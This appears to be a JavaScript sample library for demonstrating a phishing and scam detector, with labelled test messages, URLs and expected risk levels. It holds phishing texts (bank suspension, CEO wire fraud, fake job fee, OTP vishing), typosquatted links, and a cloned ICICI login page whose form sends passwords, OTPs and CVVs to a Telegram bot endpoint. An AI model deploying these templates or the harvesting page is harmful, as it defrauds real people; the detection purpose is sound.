/**
 * Demo library.
 *
 * Deliberately includes genuine messages that *look* alarming (a real OTP alert,
 * a real blocked-sign-in notice). Showing that those come back Low Risk is the
 * most convincing part of a demo — anyone can flag everything.
 */

export const SAMPLES = [
  {
    id: 'bank-suspension',
    label: 'Bank account suspension',
    expected: 'high',
    tab: 'message',
    type: 'sms',
    content:
      'Dear Customer, your SBI account will be suspended within 24 hours. Click here to verify your identity immediately: http://sbi-kyc-verify.tk/login?email=you@gmail.com'
  },
  {
    id: 'delivery-delay',
    label: 'Package delayed',
    expected: 'medium',
    tab: 'message',
    type: 'sms',
    content: 'Your package delivery has been delayed. Track it here.'
  },
  {
    id: 'genuine-otp',
    label: 'Genuine OTP alert',
    expected: 'low',
    tab: 'message',
    type: 'sms',
    content:
      '742913 is your OTP to log in to your HDFC Bank account. Valid for 10 minutes. Do not share this OTP with anyone. -HDFC Bank'
  },
  {
    id: 'bec-wire',
    label: 'Business Email Compromise',
    expected: 'high',
    tab: 'email',
    type: 'email',
    content: `From: "Rajesh Kumar (CEO)" <rajesh.kumar.ceo@gmail.com>
Reply-To: accounts.payable@finance-dept.top
Subject: Re: Are you at your desk?
Authentication-Results: spf=fail dkim=none dmarc=fail

I need you to process an urgent wire transfer to a new vendor today. Their bank account details have changed, the new details are below.

Please keep this confidential and do not discuss it with the finance team. I am travelling and cannot take calls right now.

Sent from my iPhone`
  },
  {
    id: 'genuine-signin',
    label: 'Genuine security notice',
    expected: 'low',
    tab: 'email',
    type: 'email',
    content: `From: GitHub <noreply@github.com>
Subject: New sign-in to your account
Authentication-Results: spf=pass dkim=pass dmarc=pass

New sign-in to your GitHub account from a Windows device in Pune on 3 April.

If this was you, no action is needed. You can review recent activity from your account security settings at any time. You are receiving this notification because it is part of your account security settings.`
  },
  {
    id: 'job-scam',
    label: 'Fake job offer',
    expected: 'high',
    tab: 'message',
    type: 'whatsapp',
    content:
      'Hi, we found your resume. We are hiring Data Entry Executives for work from home, salary Rs. 32,000 per month, no interview and direct joining. Pay a refundable registration fee of Rs. 750 to confirm your offer letter. Contact us on WhatsApp to start today.'
  },
  {
    id: 'vishing-otp',
    label: 'Fake bank officer (vishing)',
    expected: 'high',
    tab: 'message',
    type: 'chat',
    content:
      'This is Rajesh from the SBI fraud department. We have detected a fraudulent transaction of Rs. 47,000 on your account. To block it immediately, please share the OTP you just received on your registered mobile number.'
  },
  {
    id: 'typosquat-url',
    label: 'Typosquatted login link',
    expected: 'high',
    tab: 'url',
    url: 'http://paypa1-secure-login.tk/verify?email=victim@gmail.com'
  },
  {
    id: 'shortener-url',
    label: 'Shortened link',
    expected: 'medium',
    tab: 'url',
    url: 'https://bit.ly/3xKq9Za'
  },
  {
    id: 'clean-url',
    label: 'Legitimate link',
    expected: 'low',
    tab: 'url',
    url: 'https://support.microsoft.com/en-us/office/reset-your-password'
  },
  {
    id: 'fake-login-page',
    label: 'Cloned login page (HTML)',
    expected: 'high',
    tab: 'website',
    url: 'http://icici-netbanking-secure.tk/login',
    html: `<!doctype html>
<html><head><title>ICICI Bank - Internet Banking Login</title>
<link rel="icon" href="https://www.icicibank.com/favicon.ico">
</head>
<body oncontextmenu="return false">
<img src="https://www.icicibank.com/content/dam/icicibank/logo.png" alt="ICICI Bank">
<h2>Your account has been locked. Verify your identity now.</h2>
<form action="https://api.telegram.org/bot7742:AAH/sendMessage" method="post">
  <input type="hidden" name="chat_id" value="884219037">
  <input type="text" name="userid" placeholder="User ID">
  <input type="password" name="password" placeholder="Password">
  <input type="text" name="otp" placeholder="Enter OTP">
  <input type="text" name="cvv" placeholder="CVV">
  <button type="submit">Login</button>
</form>
<a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Help</a> <a href="#">Contact</a>
<script>document.addEventListener('paste', e => e.preventDefault());</script>
</body></html>`
  }
];

export default SAMPLES;
